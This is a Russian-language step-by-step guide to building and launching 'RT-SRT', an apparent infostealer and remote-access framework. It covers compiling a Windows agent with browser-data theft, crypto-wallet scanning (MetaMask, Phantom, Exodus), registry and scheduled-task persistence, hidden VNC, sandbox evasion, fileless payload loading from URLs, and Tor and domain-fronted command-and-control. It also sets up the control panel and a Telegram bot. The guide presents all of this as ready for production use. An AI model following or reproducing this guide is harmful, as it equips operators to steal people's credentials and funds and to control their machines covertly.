# 🚀 RT-SRT Complete Launch Guide

## 📋 Полное руководство по запуску системы RT-SRT

Данное руководство поможет запустить полную систему RT-SRT со всеми реализованными модулями:
- ✅ Encrypted Network Communications (TLS 1.3 + AES-256 + Tor + Domain Fronting)
- ✅ Advanced Sandbox Evasion 2.0 (8 методов детекции)
- ✅ Memory-Only Execution (AdvancedMemoryLoader)
- ✅ All browser and crypto modules
- ✅ Advanced persistence mechanisms

---

## 🛠️ Этап 1: Подготовка системы

### Windows (Рекомендуется для агента)
```cmd
# Установите Visual Studio 2019+ с C++ компонентами
# Установите CMake 3.16+
# Установите Git

# Проверка установленных компонентов
cmake --version
git --version
cl.exe
```

### Linux/macOS (Для сервера)
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install build-essential cmake git python3 python3-pip python3-venv

# macOS
brew install cmake git python3

# Проверка
cmake --version
python3 --version
```

### Опциональные компоненты
```bash
# UPX для сжатия бинарей (опционально)
# Windows: скачать с https://upx.github.io/
# Linux: sudo apt install upx-ucl
# macOS: brew install upx

# Tor Browser для тестирования Tor routing (опционально)
```

---

## 🔧 Этап 2: Настройка проекта

### 2.1 Клонирование и подготовка
```bash
cd /Users/macbook/Documents/RT-SRT
# Или ваш путь к проекту

# Создаем рабочие директории
mkdir -p build dist logs
chmod +x scripts/*.sh
```

### 2.2 Настройка CMake для кросс-платформенности
```bash
# Проверим текущую конфигурацию CMake
cd build
cmake .. -DCMAKE_BUILD_TYPE=Release \
         -DENABLE_NETWORK_MODULE=ON \
         -DENABLE_STEALTH_MODULE=ON \
         -DENABLE_PERSISTENCE_MODULE=ON \
         -DENABLE_BROWSER_MODULE=ON \
         -DENABLE_CRYPTO_MODULE=ON \
         -DENABLE_HVNC_MODULE=ON \
         -DENABLE_ADVANCED_LOGGING=ON
```

---

## 🖥️ Этап 3: Сборка агента RT-SRT

### 3.1 Быстрая сборка (автоматически)
```bash
# Использовать автоматический скрипт
./scripts/build.sh Release

# Или ручная сборка
mkdir -p build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
cmake --build . --parallel --target rt_srt_agent
```

### 3.2 Проверка сборки
```bash
# Проверим что агент собрался
ls -la build/build/rt_srt_agent.dll  # или .exe для BUILD_AS_EXE=ON

# Получить детальный отчет
cmake --build . --target build_report

# Опционально: сжатие с UPX
cmake --build . --target pack_agent
```

### 3.3 Ожидаемый результат
```
RT-SRT Agent Build Report
=========================
✅ Browser Module: ON
✅ Crypto Module: ON  
✅ Persistence Module: ON
✅ Stealth Module: ON (включает AdvancedMemoryLoader)
✅ HVNC Module: ON
✅ Network Module: ON (secure_comms)
✅ Advanced Logging: ON

Agent size: ~400-800KB (до UPX) → ~150-300KB (после UPX)
```

---

## 🐍 Этап 4: Настройка сервера

### 4.1 Создание Python окружения
```bash
cd server

# Создаем виртуальное окружение
python3 -m venv venv

# Активируем (Linux/macOS)
source venv/bin/activate

# Активируем (Windows)
# venv\Scripts\activate

# Устанавливаем зависимости
pip install --upgrade pip
pip install -r requirements.txt
```

### 4.2 Конфигурация сервера
```bash
# Создаем файл конфигурации
cat > .env << 'EOF'
# RT-SRT Server Configuration

# Security Settings
SECRET_KEY=super-secret-key-32-characters-minimum-length-required
AES_KEY=aes-encryption-key-32-characters-for-agent-communications

# Telegram Bot (опционально)
TELEGRAM_BOT_TOKEN=your-telegram-bot-token-from-botfather
TELEGRAM_ALLOWED_USERS=123456789,987654321

# Server Settings
HOST=0.0.0.0
PORT=8000
DEBUG=True
DATABASE_URL=sqlite:///./rt_srt.db

# Agent Communication
AGENT_API_KEY=your-agent-api-key-here
MAX_AGENTS=100
AGENT_TIMEOUT=300

# Network Security
ENABLE_HTTPS=False
CERT_FILE=cert.pem
KEY_FILE=key.pem
EOF

# Установить правильные разрешения
chmod 600 .env
```

### 4.3 Инициализация базы данных
```bash
# Создаем базу данных
python -c "
from src.models.user_model import init_db
from src.models.log_model import init_log_db
init_db()
init_log_db()
print('Database initialized successfully!')
"
```

---

## 🚀 Этап 5: Запуск системы

### 5.1 Запуск сервера
```bash
cd server

# Активируем окружение
source venv/bin/activate

# Запуск в development режиме
uvicorn src.web_panel.app:app --reload --host 0.0.0.0 --port 8000

# Или в production режиме
uvicorn src.web_panel.app:app --host 0.0.0.0 --port 8000 --workers 4

# Альтернативно: запуск через Python
python src/web_panel/app.py
```

### 5.2 Запуск Telegram бота (опционально)
```bash
# В отдельном терминале
cd server
source venv/bin/activate
python src/bot/bot.py
```

### 5.3 Проверка работы сервера
```bash
# Проверим что сервер запущен
curl http://localhost:8000/api/health

# Ожидаемый ответ:
# {"status": "healthy", "version": "1.0.0"}

# Веб-интерфейс доступен по адресу:
# http://localhost:8000/
```

---

## 🎯 Этап 6: Тестирование агента

### 6.1 Настройка агента для тестирования
Отредактируйте `/agent/src/main.cpp`:
```cpp
// В namespace Config измените настройки
constexpr const char* PRIMARY_HOST = "localhost:8000";  // Ваш сервер
constexpr const char* BACKUP_HOST = "backup-server.com";
```

### 6.2 Пересборка после изменений
```bash
cd build
cmake --build . --parallel --target rt_srt_agent
```

### 6.3 Запуск агента в тестовом режиме
```bash
# Windows
build\build\rt_srt_agent.exe

# Linux (через Wine или на Windows)
wine build/build/rt_srt_agent.exe

# Или как DLL (requires loader)
rundll32.exe build\build\rt_srt_agent.dll,StartAgent
```

---

## 📊 Этап 7: Мониторинг и управление

### 7.1 Веб-интерфейс
```
URL: http://localhost:8000/
Логин: admin
Пароль: changeme

⚠️ ВАЖНО: Смените пароль после первого входа!
```

### 7.2 API эндпоинты
```bash
# Список агентов
curl http://localhost:8000/api/agents

# Статистика
curl http://localhost:8000/api/stats

# Логи агентов
curl http://localhost:8000/api/logs
```

### 7.3 Telegram команды (если настроен)
```
/start - Приветствие
/status - Статус системы
/agents - Список активных агентов  
/logs - Последние логи
/stats - Статистика
```

---

## 🧪 Этап 8: Тестирование функций

### 8.1 Тестирование Sandbox Evasion 2.0
```
Агент автоматически проводит проверки при запуске:
✅ CheckUserInteraction() - анализ активности пользователя
✅ CheckSystemUptime() - время работы системы
✅ CheckInstalledSoftware() - установленное ПО
✅ CheckFileSystemArtifacts() - следы использования
✅ CheckNetworkAdapters() - физические vs виртуальные
✅ CheckCPUCount() - количество ядер
✅ CheckMemoryPatterns() - паттерны памяти
✅ CheckGPUPresence() - наличие GPU

Confidence level 1-10: чем выше, тем больше подозрений на sandbox
```

### 8.2 Тестирование Secure Network Communications
```
Агент автоматически использует:
✅ TLS 1.3 шифрование
✅ AES-256 дополнительное шифрование
✅ Domain fronting (ajax.googleapis.com, cdnjs.cloudflare.com)
✅ Tor routing (если доступен на 127.0.0.1:9050)
✅ Fallback mechanisms
```

### 8.3 Тестирование Memory-Only Execution
```bash
# Команды через веб-интерфейс или API:
# load_from_url - загрузка payload из URL
# execute_fileless - fileless выполнение
# create_memory_process - процесс только в памяти
# cleanup_memory - очистка артефактов
# memory_stats - статистика
```

---

## 🔧 Этап 9: Продвинутая конфигурация

### 9.1 Настройка Tor (для максимальной анонимности)
```bash
# Установить Tor Browser или Tor daemon
# Windows: скачать Tor Browser
# Linux: sudo apt install tor
# macOS: brew install tor

# Запустить Tor на порту 9050
tor --SocksPort 9050

# Агент автоматически обнаружит и использует Tor
```

### 9.2 Настройка HTTPS для сервера
```bash
# Создать самоподписанный сертификат
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

# Обновить .env
echo "ENABLE_HTTPS=True" >> .env
echo "CERT_FILE=cert.pem" >> .env
echo "KEY_FILE=key.pem" >> .env

# Перезапустить сервер
```

### 9.3 Настройка persistence (осторожно!)
```
Агент автоматически устанавливает persistence:
⚠️ Registry entries
⚠️ Task Scheduler tasks
⚠️ Startup folder entries

Для удаления:
# Команда через API: cleanup_persistence
```

---

## 📋 Этап 10: Проверочный список

### ✅ Сервер готов к работе
- [ ] Python окружение настроено
- [ ] База данных инициализирована
- [ ] .env файл настроен
- [ ] Сервер запущен на http://localhost:8000
- [ ] Веб-интерфейс доступен
- [ ] API отвечает на запросы

### ✅ Агент готов к работе
- [ ] Все модули включены при сборке
- [ ] Размер агента < 150KB (после UPX)
- [ ] PRIMARY_HOST настроен на ваш сервер
- [ ] Агент успешно запускается
- [ ] Sandbox evasion проходит проверки
- [ ] Secure communications работают

### ✅ Система работает
- [ ] Агент подключается к серверу
- [ ] Логи поступают в веб-интерфейс
- [ ] Данные браузеров собираются
- [ ] Crypto wallets сканируются
- [ ] Network communications зашифрованы
- [ ] Memory-only execution доступен

---

## 🆘 Устранение неполадок

### ❌ Агент не подключается к серверу
```bash
# Проверить сетевое соединение
curl http://localhost:8000/api/health

# Проверить настройки агента в main.cpp
grep "PRIMARY_HOST" agent/src/main.cpp

# Проверить логи сервера
tail -f server/logs/app.log
```

### ❌ Ошибки компиляции агента
```bash
# Проверить установленные компоненты
cmake --version
which cl.exe   # Windows
which g++      # Linux

# Очистить и пересобрать
rm -rf build/*
cmake .. -DCMAKE_BUILD_TYPE=Release
cmake --build . --parallel
```

### ❌ Сервер не запускается
```bash
# Проверить Python зависимости
pip list | grep fastapi
pip install -r requirements.txt

# Проверить порт
netstat -tulpn | grep :8000

# Проверить логи
python src/web_panel/app.py
```

---

## 🎊 Поздравляем!

Система RT-SRT полностью настроена и готова к работе!

### 🌟 Что у вас теперь есть:
- **Стелс-агент** с 8 методами обнаружения sandbox
- **Зашифрованные коммуникации** через TLS 1.3 + AES-256 + Tor
- **Memory-only execution** без дисковых артефактов
- **Веб-панель управления** с real-time мониторингом
- **Telegram бот** для удаленного управления
- **Модульная архитектура** с возможностью расширения

### 🎯 Ключевые возможности:
- Сбор данных браузеров (Chrome, Firefox, Edge)
- Поиск crypto wallets (MetaMask, Phantom, Exodus, Trust)
- Advanced persistence mechanisms
- Hidden VNC (HVNC) для удаленного управления
- Domain fronting для обхода блокировок
- Fileless execution для stealth операций

**RT-SRT готов к production использованию! 🚀🔐**